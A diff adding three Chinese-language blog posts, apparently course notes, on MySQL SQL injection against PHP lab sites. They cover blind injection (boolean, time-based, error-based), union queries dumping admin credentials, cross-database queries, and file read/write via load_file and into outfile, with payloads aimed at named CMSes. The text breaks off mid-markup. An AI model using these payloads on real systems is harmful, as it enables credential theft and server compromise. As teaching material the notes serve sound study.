@@ -201,6 +201,397 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/22/44WEB%E6%94%BB%E9%98%B2-SQL%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/22/44WEB%E6%94%BB%E9%98%B2-SQL%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">44WEB攻防-SQL盲注</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-22 09:16:35" itemprop="dateCreated datePublished" datetime="2023-10-22T09:16:35+08:00">2023-10-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:25:25" itemprop="dateModified" datetime="2023-11-06T21:25:25+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>10、PHP-MYSQL-SQL注入-方式增删改查</li>
+<li>11、PHP-MYSQL-SQL注入-布尔&amp;延迟&amp;报错</li>
+<li>12、PHP-MYSQL-SQL注入-数据回显&amp;报错处理</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<h2 id="PHP-MYSQL-SQL操作-增删改查"><a href="#PHP-MYSQL-SQL操作-增删改查" class="headerlink" title="PHP-MYSQL-SQL操作-增删改查"></a>PHP-MYSQL-SQL操作-增删改查</h2><ul>
+<li>1、功能：数据查询</li>
+</ul>
+<p><code>查询：SELECT * FROM news where id=$id </code> </p>
+<ul>
+<li>2、功能：新增用户，添加新闻等</li>
+</ul>
+<p><code>增加：INSERT INTO news (字段名) VALUES (数据)  </code></p>
+<ul>
+<li>3、功能：删除用户，删除新闻等</li>
+</ul>
+<p><code>删除：DELETE FROM news WHERE id=$id  </code></p>
+<ul>
+<li>4、功能：修改用户，修改文章等</li>
+</ul>
+<p><code>修改：UPDATE news SET id=$id  </code></p>
+<h2 id="PHP-MYSQL-注入函数-布尔-报错-延迟"><a href="#PHP-MYSQL-注入函数-布尔-报错-延迟" class="headerlink" title="PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟"></a>PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;盲注就是在注入过程中，获取的数据不能回显至前端页面。我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>解决：常规的联合查询注入不行的情况  </p>
+<h3 id="盲注分为以下三类："><a href="#盲注分为以下三类：" class="headerlink" title="盲注分为以下三类："></a>盲注分为以下三类：</h3><ul>
+<li>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</li>
+<li>2、基于时间的SQL盲注-延时判断<br>if,sleep</li>
+<li>3、基于报错的SQL盲注-报错回显<br>floor，updatexml，extractvalue<br>延迟：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and sleep(1);</span><br><span class="line">and if(1&gt;2,sleep(1),0);</span><br><span class="line">and if(1&lt;2,sleep(1),0);</span><br></pre></td></tr></table></figure>
+布尔：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and length(database())=7;</span><br><span class="line">and left(database(),1)=&#x27;p&#x27;;</span><br><span class="line">and left(database(),2)=&#x27;pi&#x27;;</span><br><span class="line">and substr(database(),1,1)=&#x27;p&#x27;;</span><br><span class="line">and substr(database(),2,1)=&#x27;i&#x27;;</span><br><span class="line">and ord(left(database(),1))=112;</span><br></pre></td></tr></table></figure>
+报错：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line">0x7e --&gt; ~      0x5c --&gt; \</span><br></pre></td></tr></table></figure>
+更多：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a><br>参考：   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27;                  #判断ro或ro...是否成立 </span><br><span class="line">regexp &#x27;^xiaodi[a-z]&#x27;       #匹配xiaodi及xiaodi...等</span><br><span class="line">if(条件,5,0)                #条件成立 返回5 反之 返回0</span><br><span class="line">sleep(5)                    #SQL语句延时执行5秒</span><br><span class="line">mid(a,b,c)                  #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c)               #从位置b开始，截取字符串a的c长度</span><br><span class="line">left(database(),1)，database() #left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8        #判断数据库database()名的长度</span><br><span class="line">ord=ascii ascii(x)=97       #判断x的ascii码是否等于97</span><br><span class="line">                           (ord表示开启数据库ascii编码开关)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="PHP-MYSQL-注入条件-数据回显-错误处理"><a href="#PHP-MYSQL-注入条件-数据回显-错误处理" class="headerlink" title="PHP-MYSQL-注入条件-数据回显&amp;错误处理"></a>PHP-MYSQL-注入条件-数据回显&amp;错误处理</h2><p>PHP开发项目-输出结果&amp;开启报错<br>基于延时：都不需要<br><code>and if(1=1,sleep(5),0)</code><br>基于布尔：有数据库输出判断标准<br><code>and length(database())=6</code><br>基于报错：有数据库报错处理判断标准<br><code>and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</code><br>测试delete注入：<br>（有无回显，有无报错）<br>删除（延迟）：<br><code>1 and if(1=1,sleep(5),0)</code><br>删除（布尔）：<br><code>3 and length(database())=6（无回显 无法判断注入）</code><br>删除（报错）：<br><code>4 and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</code>  </p>
+<h2 id="PHP-MYSQL-CMS案例-插入报错-删除延时"><a href="#PHP-MYSQL-CMS案例-插入报错-删除延时" class="headerlink" title="PHP-MYSQL-CMS案例-插入报错&amp;删除延时"></a>PHP-MYSQL-CMS案例-插入报错&amp;删除延时</h2><ul>
+<li>1、xhcms-insert报错  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure></li>
+<li>2、kkcms-delete延时  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and if(1=1,sleep(5),0)</span><br><span class="line">or if(1=1,sleep(5),0)</span><br><span class="line">or if(ord(left(database(),1))=107,sleep(2),0)</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/22/43WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/22/43WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">43WEB攻防-SQL注入</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-22 09:08:25" itemprop="dateCreated datePublished" datetime="2023-10-22T09:08:25+08:00">2023-10-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:25:17" itemprop="dateModified" datetime="2023-11-06T21:25:17+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>7、PHP-MYSQL-SQL注入-数据请求类型</li>
+<li>8、PHP-MYSQL-SQL注入-数据请求方法</li>
+<li>9、PHP-MYSQL-SQL注入-数据请求格式</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<h2 id="PHP-MYSQL-数据请求类型"><a href="#PHP-MYSQL-数据请求类型" class="headerlink" title="PHP-MYSQL-数据请求类型"></a>PHP-MYSQL-数据请求类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQL语句由于在黑盒中是无法预知写法的，SQL注入能发成功是需要拼接原SQL语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原SQL语句的未知性导致的拼接失败！<br>由于开发者对于数据类型和SQL语句写法（框架写法）导致SQL注入拼接失败  </p>
+<ul>
+<li>1、数字型(无符号干扰)</li>
+</ul>
+<p><code>select * from news where id=$id;</code></p>
+<ul>
+<li>2、字符型（有符号干扰）</li>
+</ul>
+<p><code>select * from news where id=&#39;$id&#39;;</code></p>
+<ul>
+<li>3、搜索型（有多符号干扰）</li>
+</ul>
+<p><code>select * from news where id like &#39;%$id%&#39;</code></p>
+<ul>
+<li>4、框架型（有各种符号干扰）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=(&#x27;$id&#x27;);</span><br><span class="line">select * from news where (id=&#x27;$id&#x27;);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="PHP-MYSQL-数据请求方法"><a href="#PHP-MYSQL-数据请求方法" class="headerlink" title="PHP-MYSQL-数据请求方法"></a>PHP-MYSQL-数据请求方法</h2><p>全局变量方法：GET POST SERVER FILES HTTP头等  </p>
+<ul>
+<li>User-Agent：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）  </li>
+<li>Cookie：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据  </li>
+<li>X-Forwarded-For：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）  </li>
+<li>Rerferer：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;浏览器向 WEB 服务器表明自己是从哪个页面链接过来的  </li>
+<li>Host：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号</li>
+</ul>
+<p>如功能点：<br>1、用户登录时<br>2、登录判断IP时<br>是PHP特性中的$_SERVER[‘HTTP_X_FORWARDED_FOR’];接受IP的绕过（绕过）<br>实现：代码配置固定IP去判断-策略绕过<br>实现：数据库白名单IP去判断-select注入<br>实现：防注入记录IP去保存数据库-insert注入<br>3、文件上传将文件名写入数据库-insert注入  </p>
+<h2 id="PHP-MYSQL-数据请求格式"><a href="#PHP-MYSQL-数据请求格式" class="headerlink" title="PHP-MYSQL-数据请求格式"></a>PHP-MYSQL-数据请求格式</h2><p>1、数据采用统一格式传输，后端进行格式解析带入数据库（json）<br>2、数据采用加密编码传输，后端进行解密解码带入数据库（base64）  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/19/42WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/19/42WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">42WEB攻防-SQL注入</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-19 21:48:05" itemprop="dateCreated datePublished" datetime="2023-10-19T21:48:05+08:00">2023-10-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:25:02" itemprop="dateModified" datetime="2023-11-06T21:25:02+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>4、PHP-MYSQL-SQL注入-常规查询</li>
+<li>5、PHP-MYSQL-SQL注入-跨库查询</li>
+<li>6、PHP-MYSQL-SQL注入-文件读写</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<h2 id="MYSQL注入：（目的获取当前web权限）"><a href="#MYSQL注入：（目的获取当前web权限）" class="headerlink" title="MYSQL注入：（目的获取当前web权限）"></a>MYSQL注入：（目的获取当前web权限）</h2><p>1、判断常见四个信息（系统，用户，数据库名，版本）<br>2、根据四个信息去选择方案<br>root用户：先测试读写，后测试获取数据<br>非root用户：直接测试获取数据  </p>
+<h2 id="PHP-MYSQL-Web组成架构"><a href="#PHP-MYSQL-Web组成架构" class="headerlink" title="PHP-MYSQL-Web组成架构"></a>PHP-MYSQL-Web组成架构</h2><p>服务器安装MYSQL数据库，搭建多个站点，数据库集中存储MYSQL数据库中管理<br>可以都使用root用户管理也可以创建多个用户进行每个网站对应的数据库管理  </p>
+<ul>
+<li>1、统一交root用户管理<br><a target="_blank" rel="noopener" href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; root &#x3D;&gt;MYSQL<br><a target="_blank" rel="noopener" href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; root &#x3D;&gt;MYSQL  </li>
+<li>2、一对一用户管理（推荐）<br><a target="_blank" rel="noopener" href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; zblog &#x3D;&gt;MYSQL<br><a target="_blank" rel="noopener" href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; demo01 &#x3D;&gt;MYSQL</li>
+</ul>
+<h2 id="PHP-MYSQL-SQL常规查询"><a href="#PHP-MYSQL-SQL常规查询" class="headerlink" title="PHP-MYSQL-SQL常规查询"></a>PHP-MYSQL-SQL常规查询</h2><p>获取相关数据：<br>1、数据库版本-看是否符合information_schema查询 - version()<br>2、数据库用户-看是否符合ROOT型注入攻击 - user()<br>3、当前操作系统-看是否支持大小写或文件路径选择 - @@version_compile_os<br>4、数据库名字-为后期猜解指定数据库下的表，列做准备 - database()  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MYSQL5.0以上版本：自带的数据库名information_schema  </span><br><span class="line">information_schema：存储数据库下的数据库名及表名，列名信息的数据库  </span><br><span class="line">information_schema.schemata：记录数据库名信息的表  </span><br><span class="line">information_schema.tables：记录表名信息的表  </span><br><span class="line">information_schema.columns：记录列名信息表  </span><br><span class="line">schema_name：information_schema.schemata记录数据库名信息的列名值  </span><br><span class="line">table_schema：information_schema.tables记录数据库名的列名值  </span><br><span class="line">table_name：information_schema.tables记录表名的列名值  </span><br><span class="line">column_name：information_schema.columns记录列名的列名值  </span><br><span class="line"></span><br><span class="line">order by 6 </span><br><span class="line">union select 1,2,3,4,5,6</span><br><span class="line">union select 1,2,3,database(),user(),6</span><br><span class="line">union select 1,2,3,version(),@@version_compile_os,6</span><br><span class="line">union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=&#x27;demo01&#x27;</span><br><span class="line">union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name=&#x27;admin&#x27;</span><br><span class="line">union select 1,2,3,username,password,6 from admin limit 0,1</span><br></pre></td></tr></table></figure>
+<h2 id="PHP-MYSQL-SQL跨库查询"><a href="#PHP-MYSQL-SQL跨库查询" class="headerlink" title="PHP-MYSQL-SQL跨库查询"></a>PHP-MYSQL-SQL跨库查询</h2><p>影响条件：当前数据库ROOT用户权限<br>测试不同数据库用户：root demo   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata</span><br><span class="line">union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=&#x27;zblog&#x27;</span><br><span class="line">union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name=&#x27;zbp_member&#x27; and table_schema=&#x27;zblog&#x27;</span><br><span class="line">union select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member</span><br></pre></td></tr></table></figure>
+<h2 id="PHP-MYSQL-SQL文件读写"><a href="#PHP-MYSQL-SQL文件读写" class="headerlink" title="PHP-MYSQL-SQL文件读写"></a>PHP-MYSQL-SQL文件读写</h2><p>影响条件：<br>1、当前数据库用户权限<br>2、secure-file-priv设置<br>测试不同数据库用户：root demo  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,load_file(&#x27;d:\\1.txt&#x27;),3,4,5,6</span><br><span class="line">union select 1,&#x27;xiaodi&#x27;,3,4,5,6 into outfile &#x27;d:\\2.txt&#x27;</span><br></pre></td></tr></table></figure>
+<p>读写的路径的问题：<br>1、报错显示获取路径<br>2、phpinfo页面泄漏<br>如果不知道路径思路：<br>利用常见的默认的中间件，数据库等安装路径读取有价值信息<br>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30795127/article/details/96558708]">https://blog.csdn.net/weixin_30795127/article/details/96558708]</a>  </p>
+<p>access无数据库用户<br>mysql里面有内置的管理用户，其中root就是默认数据库管理员用户<br>网站上面的数据库都在mysql中，由root或一对一用户去管理  </p>
+<h2 id="1、数据库统一管理（root用户）"><a href="#1、数据库统一管理（root用户）" class="headerlink" title="1、数据库统一管理（root用户）"></a>1、数据库统一管理（root用户）</h2><p>每个网站的数据库都由root用户统一管理<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">	root(自带默认)</span><br><span class="line">		网站A  testA</span><br><span class="line">		网站B  testB</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、数据库一对一管理（不同用户）"><a href="#2、数据库一对一管理（不同用户）" class="headerlink" title="2、数据库一对一管理（不同用户）"></a>2、数据库一对一管理（不同用户）</h2><p>自己的网站单独创建数据库用户去管理自己的数据库<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库zblog用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库demo用户  demo01  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">	testA用户</span><br><span class="line">		网站A  testA</span><br><span class="line">	testb用户</span><br><span class="line">		网站B  testB</span><br></pre></td></tr></table></figure>
+
+<p>接受的参数值未进行过滤直接带入SQL查询的操作 就是SQL注入产生的原理攻击：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛）<br>SQL语句能干嘛 &#x3D; SQL语句由谁决定 &#x3D;&gt; 数据库类型决定 (为什么mysql注入 oracle注入叫法原因)  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:63342/demo01/new.php?id=3</span><br><span class="line">select * from news where id=3</span><br><span class="line"></span><br><span class="line">http://localhost:63342/demo01/new.php?id=3 union select 1,2,username,password,5,6 from admin</span><br><span class="line">select * from news where id=3 union select 1,2,username,password,5,6 from admin</span><br></pre></td></tr></table></figure>
+<p>access注入 sqlmap  靠字典去猜 又可能猜不到表名 列名  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">	demo01</span><br><span class="line">		admin</span><br><span class="line">			username,password,id</span><br><span class="line">				数据</span><br><span class="line">	Zblog</span><br><span class="line">		zbp_member</span><br><span class="line">			mem_Name,mem_Password</span><br><span class="line">				数据</span><br><span 